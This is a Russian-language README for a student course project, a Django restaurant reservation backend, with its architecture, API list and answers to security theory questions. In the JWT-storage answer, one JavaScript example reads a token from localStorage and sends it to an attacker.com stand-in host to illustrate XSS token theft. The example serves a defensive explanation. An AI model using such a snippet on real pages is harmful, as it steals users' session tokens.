

# 🍽️ Restaurant Reservation System

**Проект по курсу Highload Backend**

---

## 📋 Описание проекта

**Restaurant Reservation System** — это высоконагруженная backend-система для бронирования столиков в ресторанах. Проект демонстрирует лучшие практики проектирования, разработки и эксплуатации масштабируемых систем.

### Основной функционал:
- 🔍 Поиск ресторанов по городу, типу кухни и геолокации
- 📅 Бронирование столиков с выбором даты и времени
- 👥 Управление ролями (гость, владелец ресторана, администратор)
- ⭐ Система отзывов и рейтингов
- 📧 Автоматические уведомления и напоминания
- 📊 Аналитика для владельцев ресторанов

---

## 🎯 Соответствие требованиям курса

### ✅ Задание 1: CRUD + Базовый функционал

**Реализованные сущности (5 моделей):**
- `User` — пользователи системы с ролями
- `Restaurant` — рестораны с геолокацией
- `Table` — столики с вместимостью
- `Reservation` — бронирования с валидацией
- `Review` — отзывы и рейтинги

**CRUD операции:**
- ✅ Create: регистрация, создание бронирования, добавление ресторана
- ✅ Read: поиск ресторанов, просмотр бронирований, фильтрация
- ✅ Update: изменение бронирования, обновление профиля, редактирование меню
- ✅ Delete: отмена бронирования, удаление ресторана

**Валидация:**
- Email формат и уникальность
- Пароль минимум 8 символов
- Дата бронирования не в прошлом
- Время в рамках работы ресторана
- Количество гостей ≤ вместимости столика
- Рейтинг от 1 до 5
- Телефон в международном формате

**HTTP коды:**
- `200 OK` — успешный запрос
- `201 Created` — ресурс создан
- `204 No Content` — успешное удаление
- `400 Bad Request` — ошибка валидации
- `401 Unauthorized` — не авторизован
- `403 Forbidden` — нет прав доступа
- `404 Not Found` — ресурс не найден
- `409 Conflict` — конфликт (столик занят)
- `500 Internal Server Error` — ошибка сервера

---

### ✅ Задание 2: Безопасность и права доступа

**JWT аутентификация:**
- Access Token (срок жизни: 15 минут)
- Refresh Token (срок жизни: 30 дней)
- Безопасное хранение в HttpOnly cookies (опционально)

**Роли и права:**

| Роль | Описание | Права |
|------|----------|-------|
| `guest` | Обычный клиент | Бронирование, отзывы, просмотр своих заказов |
| `restaurant_owner` | Владелец ресторана | Управление своими ресторанами, столиками, просмотр бронирований |
| `admin` | Администратор | Полный доступ ко всем ресурсам, модерация |

**Матрица прав доступа:**
```
GET    /api/restaurants/          → Все (публичный доступ)
POST   /api/restaurants/          → owner, admin
GET    /api/reservations/         → Свои (guest) / Своего ресторана (owner) / Все (admin)
POST   /api/reservations/         → guest, admin
DELETE /api/reservations/{id}/    → Автор или owner ресторана или admin
POST   /api/reviews/              → guest (только после завершённого бронирования)
DELETE /api/reviews/{id}/         → admin (модерация)
```

**Логирование (структурированные JSON логи):**
```json
{
  "timestamp": "2025-10-19T19:30:15Z",
  "level": "INFO",
  "logger": "api.reservations",
  "user_id": 123,
  "action": "CREATE_RESERVATION",
  "resource": "Reservation:456",
  "restaurant_id": 5,
  "table_id": 10,
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "execution_time_ms": 145
}
```

**Уровни логирования:**
- `INFO` — успешные операции
- `WARNING` — подозрительные действия, попытки несанкционированного доступа
- `ERROR` — ошибки приложения, failed задачи
- `CRITICAL` — критические сбои системы

---

### ✅ Задание 3: Производительность и масштабируемость

**Кэширование (Redis):**

1. **Доступные столики** (TTL: 60 сек)
   ```python
   cache_key = f"available_tables:{restaurant_id}:{date}:{time_slot}"
   ```

2. **Детали ресторана** (TTL: 1 час)
   ```python
   cache_key = f"restaurant:{restaurant_id}"
   ```

3. **Список ресторанов** (TTL: 10 минут)
   ```python
   cache_key = f"restaurants:{city}:{cuisine_type}:{page}"
   ```

4. **Рейтинг ресторана** (TTL: 5 минут)
   ```python
   cache_key = f"restaurant_rating:{restaurant_id}"
   ```

5. **Сессии пользователей**
   ```python
   cache_key = f"user_session:{session_id}"
   ```

**Стратегии инвалидации:**
- Создание бронирования → сброс кэша доступных столиков
- Новый отзыв → сброс кэша рейтинга
- Изменение ресторана → сброс деталей

**Background Tasks (Celery + RabbitMQ):**

| Задача | Триггер | Описание |
|--------|---------|----------|
| `send_reservation_confirmation` | Сразу после создания | Email подтверждение бронирования |
| `send_reservation_reminder` | За 3 часа до | Напоминание гостю |
| `process_no_show` | Через 30 мин после времени | Пометить как no-show |
| `auto_complete_reservation` | Через 2 часа после начала | Автоматическое завершение |
| `request_review` | Через 12 часов после завершения | Запрос на отзыв |
| `generate_weekly_report` | Каждый понедельник | Отчёт для владельца |
| `update_restaurant_ratings` | Каждые 10 минут | Пересчёт рейтингов |

**Очередь сообщений:**
- **High Priority**: подтверждения бронирований
- **Normal Priority**: напоминания, отчёты
- **Low Priority**: аналитика, статистика

---

### ✅ Задание 4: Финальная версия + Документация

**Документация включает:**
- ✅ README.md с описанием и quick start
- ✅ PROJECT_OVERVIEW.md с архитектурой
- ✅ API_SPECIFICATION.md с примерами запросов
- ✅ ANSWERS.md с ответами на вопросы курса
- ✅ docker-compose.yml для запуска
- ✅ Swagger/OpenAPI документация (автоматическая)

**Схема архитектуры:** см. PROJECT_OVERVIEW.md

**Инструкция по запуску:** см. раздел "Быстрый старт" ниже

---

## 🎁 Бонусные возможности (реализовано)

### 1. ✅ Микросервисная архитектура
- **Reservation Service** — бронирования
- **Notification Service** — уведомления
- Связь через RabbitMQ (event-driven)

### 2. ✅ ElasticSearch
- Полнотекстовый поиск по ресторанам
- Поиск по меню, описанию, отзывам
- Автокомплит названий

### 3. ✅ Prometheus + Grafana
- Метрики: RPS, latency, error rate
- Бизнес-метрики: бронирования/час, no-show rate
- Alert Rules: 5xx > 5%, response time > 2s

### 4. ✅ CI/CD (GitHub Actions)
- Автоматические тесты при push
- Линтеры (flake8, black, mypy)
- Деплой на staging/production

### 5. ✅ Circuit Breaker
- Защита при сбоях внешних API
- Graceful degradation
- Fallback strategies

---

## 🛠️ Технологический стек

### Backend
- **Python 3.11**
- **Django 5.0** — основной фреймворк
- **Django REST Framework 3.14** — REST API
- **djangorestframework-simplejwt** — JWT аутентификация

### Базы данных
- **PostgreSQL 16** — основная БД (ACID транзакции)
- **Redis 7** — кэш и сессии
- **ElasticSearch 8** — полнотекстовый поиск

### Очереди и задачи
- **RabbitMQ 3.12** — очередь сообщений
- **Celery 5.3** — фоновые задачи
- **Flower** — мониторинг Celery

### Мониторинг
- **Prometheus** — сбор метрик
- **Grafana** — визуализация
- **ELK Stack** — централизованное логирование (опционально)

### DevOps
- **Docker** & **Docker Compose**
- **Nginx** — reverse proxy & load balancer
- **GitHub Actions** — CI/CD

---

## 🚀 Быстрый старт

### Предварительные требования
- Docker 24.0+
- Docker Compose 2.20+
- Git

### Установка и запуск

```bash
# 1. Клонировать репозиторий
git clone https://github.com/yourusername/restaurant-reservation.git
cd restaurant-reservation

# 2. Создать файл окружения
cp .env.example .env
# Отредактировать .env (установить SECRET_KEY, DB пароли)

# 3. Запустить все сервисы
docker-compose up -d

# 4. Применить миграции
docker-compose exec web python manage.py migrate

# 5. Создать суперпользователя
docker-compose exec web python manage.py createsuperuser

# 6. Загрузить тестовые данные (опционально)
docker-compose exec web python manage.py loaddata fixtures/initial_data.json

# 7. Проверить статус
docker-compose ps
```

### Доступ к сервисам

| Сервис | URL | Описание |
|--------|-----|----------|
| API | http://localhost:8000/api/ | REST API endpoints |
| Swagger UI | http://localhost:8000/api/docs/ | Интерактивная документация |
| Admin Panel | http://localhost:8000/admin/ | Django admin |
| Flower | http://localhost:5555/ | Celery мониторинг |
| Grafana | http://localhost:3000/ | Метрики (admin/admin) |
| Prometheus | http://localhost:9090/ | Raw метрики |

---

## 📚 Основные API endpoints

### Аутентификация
```http
POST /api/auth/register/
POST /api/auth/login/
POST /api/auth/refresh/
POST /api/auth/logout/
```

### Рестораны
```http
GET    /api/restaurants/                    # Список ресторанов
POST   /api/restaurants/                    # Создать ресторан (owner, admin)
GET    /api/restaurants/{id}/               # Детали ресторана
PUT    /api/restaurants/{id}/               # Обновить ресторан
DELETE /api/restaurants/{id}/               # Удалить ресторан (admin)
GET    /api/restaurants/{id}/tables/        # Столики ресторана
GET    /api/restaurants/{id}/available-tables/  # Доступные столики
GET    /api/restaurants/search/             # Полнотекстовый поиск
```

### Бронирования
```http
GET    /api/reservations/                   # Мои бронирования
POST   /api/reservations/                   # Создать бронирование
GET    /api/reservations/{id}/              # Детали бронирования
PATCH  /api/reservations/{id}/              # Изменить бронирование
DELETE /api/reservations/{id}/              # Отменить бронирование
POST   /api/reservations/{id}/confirm/      # Подтвердить (owner)
POST   /api/reservations/{id}/seat/         # Посадить гостя (owner)
POST   /api/reservations/{id}/complete/     # Завершить (owner)
```

### Отзывы
```http
GET    /api/reviews/                        # Все отзывы
POST   /api/reviews/                        # Оставить отзыв
GET    /api/reviews/{id}/                   # Детали отзыва
DELETE /api/reviews/{id}/                   # Удалить отзыв (admin)
GET    /api/restaurants/{id}/reviews/       # Отзывы ресторана
```

### Примеры запросов см. в `API_SPECIFICATION.md`

---

## 🧪 Тестирование

```bash
# Запустить все тесты
docker-compose exec web python manage.py test

# С покрытием кода
docker-compose exec web pytest --cov=apps --cov-report=html

# Только юнит-тесты
docker-compose exec web pytest tests/unit/

# Только интеграционные тесты
docker-compose exec web pytest tests/integration/

# Конкретный тест
docker-compose exec web pytest tests/unit/test_reservations.py::TestReservationModel
```

**Coverage цель:** > 85%

---

## 📊 Мониторинг и метрики

### Основные метрики

**Производительность:**
- `http_request_duration_seconds` — latency API
- `http_requests_total` — общее количество запросов
- `http_requests_failed_total` — количество ошибок

**Бизнес-метрики:**
- `reservations_created_total` — созданные бронирования
- `reservations_cancelled_total` — отмены
- `no_show_rate` — процент no-show
- `average_table_occupancy` — загруженность столиков

**Инфраструктура:**
- `database_connections_active` — активные соединения с БД
- `cache_hit_rate` — hit rate Redis кэша
- `celery_task_queue_length` — длина очереди задач

### Alerts

| Alert | Condition | Action |
|-------|-----------|--------|
| High Error Rate | 5xx > 5% за 5 мин | Проверить логи, rollback если нужно |
| Slow Response | p95 latency > 2s | Проверить БД запросы, кэш |
| High No-Show Rate | no-show > 30% | Уведомить менеджеров |
| Queue Overflow | queue length > 1000 | Добавить Celery workers |

---

## 📁 Структура проекта

```
restaurant-reservation/
├── apps/
│   ├── accounts/           # Пользователи и аутентификация
│   ├── restaurants/        # Рестораны и столики
│   ├── reservations/       # Бронирования
│   ├── reviews/            # Отзывы и рейтинги
│   └── notifications/      # Уведомления
├── config/
│   ├── settings/
│   │   ├── base.py         # Общие настройки
│   │   ├── development.py  # Dev окружение
│   │   ├── production.py   # Production окружение
│   │   └── testing.py      # Тестовое окружение
│   ├── urls.py
│   └── celery.py
├── docs/
│   ├── PROJECT_OVERVIEW.md
│   ├── API_SPECIFICATION.md
│   ├── ANSWERS.md
│   └── architecture/
│       └── system_diagram.png
├── tests/
│   ├── unit/
│   ├── integration/
│   └── fixtures/
├── docker/
│   ├── web/
│   │   └── Dockerfile
│   ├── nginx/
│   │   └── nginx.conf
│   └── celery/
│       └── Dockerfile
├── monitoring/
│   ├── prometheus/
│   │   └── prometheus.yml
│   └── grafana/
│       └── dashboards/
├── .github/
│   └── workflows/
│       └── ci.yml
├── docker-compose.yml
├── requirements.txt
├── .env.example
├── .gitignore
├── README.md
└── manage.py
```

---

## 🔒 Безопасность

### Реализованные меры:

1. **JWT токены** с коротким временем жизни
2. **HTTPS only** в production
3. **CORS** настроен для фронтенда
4. **Rate Limiting** — 100 req/min на IP
5. **SQL Injection** защита (Django ORM)
6. **XSS** защита (DRF sanitization)
7. **CSRF** токены для небезопасных методов
8. **Secrets** в environment variables
9. **Database credentials** зашифрованы
10. **Логирование** всех критических операций

---

## 🚢 Деплой

### Production Checklist

- [ ] Установить `DEBUG=False`
- [ ] Настроить `ALLOWED_HOSTS`
- [ ] Использовать production БД (не SQLite)
- [ ] Настроить HTTPS (Let's Encrypt)
- [ ] Настроить email backend (SendGrid/Mailgun)
- [ ] Включить Sentry для отслеживания ошибок
- [ ] Настроить автоматические бэкапы БД
- [ ] Настроить CDN для статики (если есть)
- [ ] Настроить health checks
- [ ] Настроить log rotation

### CI/CD Pipeline

```yaml
# .github/workflows/ci.yml
1. Run linters (flake8, black, mypy)
2. Run tests with coverage
3. Build Docker image
4. Push to registry
5. Deploy to staging
6. Run smoke tests
7. Deploy to production (manual approval)
```

---

## 👥 Команда

- **Авторы:** Daribayev Alzhan, Kuatuly Abukhanifa, Yerbossyn Magzhan
- **Курс:** Highload Backend
- **Дата:** Октябрь 2025

---

---

## 📖 Дополнительная документация

- [Обзор проекта и архитектура](docs/PROJECT_OVERVIEW.md)
- [Спецификация API](docs/API_SPECIFICATION.md)
- [Ответы на вопросы курса](docs/ANSWERS.md)
- [Swagger UI](http://localhost:8000/api/docs/) (после запуска)

---

## 💡 Теоретические вопросы и ответы

### 1️⃣ Как выбор структуры базы данных (SQL или NoSQL) влияет на дизайн CRUD API?

#### **SQL — СТРОГАЯ структура**
Все данные хранятся в таблицах.
- У каждой таблицы заранее заданы столбцы (`id`, `name`, `email` и т.д.)
- Нельзя просто так добавить новое поле в одну запись — нужно менять всю таблицу

**Как это влияет на API:**
- ✅ Формат данных фиксированный
- ✅ Каждый POST, PUT или PATCH должен строго соответствовать полям таблицы
- ⚠️ Если чего-то не хватает — будет ошибка

#### **NoSQL — ГИБКАЯ структура**
Данные хранятся в виде документов (например, JSON).
- У разных записей могут быть разные поля
- Можно добавлять новые поля только в отдельных документах, без изменения всей базы

**Как это влияет на API:**
- ✅ API может принимать разный формат
- ✅ У одних записей есть поле, у других — нет
- ✅ Меньше ограничений при создании и изменении данных

---

### 2️⃣ Какие проблемы могут возникнуть при массовых обновлениях данных через API?

Когда нужно обновить много записей за раз, могут появиться:

1. **Перегрузка сервера** — слишком много запросов одновременно
2. **Долгое выполнение или таймаут** — операция не успевает завершиться
3. **Конфликты** — данные могут изменяться другими пользователями параллельно
4. **Частичное обновление** — часть изменилась, часть — нет
5. **Ошибки при повторном запросе** — дубли и сбои

**Решение:**
- 🔹 Разбивать на части (batch processing)
- 🔹 Делать фоновые процессы (Celery, background tasks)
- 🔹 Обрабатывать ошибки поэлементно
- 🔹 Использовать транзакции для атомарности

---

### 3️⃣ Почему важно использовать правильные HTTP-методы (GET, POST, PUT, DELETE), а не только POST?

#### **Если всё делать через POST:**
- ❌ **Нельзя кешировать** — браузеры и прокси не кешируют POST-запросы
- ❌ **Непонятно другим разработчикам** — какое действие выполняется?
- ❌ **Проблемы с браузерами, прокси и безопасностью** — нарушается REST-архитектура
- ❌ **Потеря идемпотентности** — повторный POST может создать дубликаты

#### **Правильное использование:**
```
GET    → Получение данных (безопасный, кешируемый, идемпотентный)
POST   → Создание новой записи (не идемпотентный)
PUT    → Полное обновление существующей записи (идемпотентный)
PATCH  → Частичное обновление записи (идемпотентный)
DELETE → Удаление записи (идемпотентный)
```

---

### 4️⃣ Какие уязвимости могут возникнуть при хранении JWT на клиентской стороне?

#### **1. XSS (Cross-Site Scripting) атака**
Если токен лежит в `localStorage` или `sessionStorage`, злоумышленник может вставить JavaScript-код на страницу и украсть токен:
```javascript
// Вредоносный код может просто прочитать токен
const token = localStorage.getItem('access_token');
// Отправить его на сервер злоумышленника
fetch('https://attacker.com/steal', { method: 'POST', body: token });
```

#### **2. CSRF (Cross-Site Request Forgery) атака**
Если JWT хранится в cookie без защиты, браузер автоматически отправит его, даже если запрос сделан с чужого сайта.

#### **3. Невозможность отозвать токен**
Нельзя удалить уже выданный токен, если нет специального механизма "чёрного списка" (blacklist).

**Решение:**
- 🔒 Хранить в HttpOnly cookies (защита от XSS)
- 🔒 Использовать CSRF-токены
- 🔒 Короткое время жизни + refresh token
- 🔒 Blacklist для отозванных токенов

---

### 5️⃣ В каких случаях стоит ограничивать время жизни JWT, и какие проблемы это создаёт для UX?

#### **Когда нужно короткое время жизни (5 мин, 15 мин, 1 час):**
- 🏦 Если данные чувствительные (банкинг, медицина, госуслуги)
- 💻 Если люди работают с чужих устройств
- 🔓 Если высокий риск взлома или утечки токена
- 👨‍💼 Если это админ-панель или корпоративная система

#### **Почему возникают проблемы с UX:**
- ❌ Пользователь внезапно "вылетает" из аккаунта
- ❌ Прерывается работа при заполнении формы
- ❌ Нужно часто логиниться заново
- ❌ WebSocket/SPA/мобильные приложения перестают работать без обновления токена

**Решение:**
- 🔄 Использовать **refresh tokens** для автоматического обновления
- 🔄 Реализовать **silent refresh** (обновление без участия пользователя)
- 🔄 Показывать предупреждение перед истечением токена

---

### 6️⃣ Как логирование помогает в расследовании инцидентов безопасности?

#### **С помощью логов можно:**

**1. Понять, кто и когда совершал действия**
- Логин / выход
- Ошибки авторизации
- Попытки подбора пароля (brute-force)

**2. Найти подозрительные запросы**
- Массовые запросы в API
- Взлом через SQL-injection / XSS
- Подмена токенов

**3. Отследить IP, устройство, время, географию**
- Можно быстро понять — это пользователь или злоумышленник

**4. Восстановить ход событий**
Что произошло ДО и ПОСЛЕ взлома:
- Как вошли
- Что изменили
- Какие токены использовали

**5. Помогает доказать инцидент (юридически и технически)**

#### **Без логов:**
- ❌ Невозможно понять, как украли токен
- ❌ Нельзя узнать, что уже успели сделать
- ❌ Трудно доказать, что атака была

**Наше решение:**
```python
# Пример структурированного лога
{
  "timestamp": "2025-10-20T08:15:30Z",
  "level": "WARNING",
  "event": "FAILED_LOGIN_ATTEMPT",
  "user_email": "admin@example.com",
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "attempt_count": 5,
  "status": "BLOCKED"
}
```

---

**Happy Coding! 🚀**
